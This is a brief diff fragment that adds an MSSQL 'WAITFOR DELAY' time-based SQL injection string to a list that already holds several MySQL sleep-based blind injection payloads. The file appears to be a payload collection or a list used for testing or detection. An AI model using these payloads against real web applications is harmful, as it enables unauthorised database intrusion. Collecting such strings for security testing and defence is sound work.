@@ -49,6 +49,7 @@
   - 0’XOR(if(now()=sysdate(),sleep(6),0))XOR’Z
   - 63770’XOR(if(now()=sysdate(),sleep(6),0))XOR’Z
   - a%3C%22+UNION+SELECT+SLEEP(20);--+-
+  - 99+WAITFOR+DELAY+'0:0:25'--+wXy
   
   ```
   
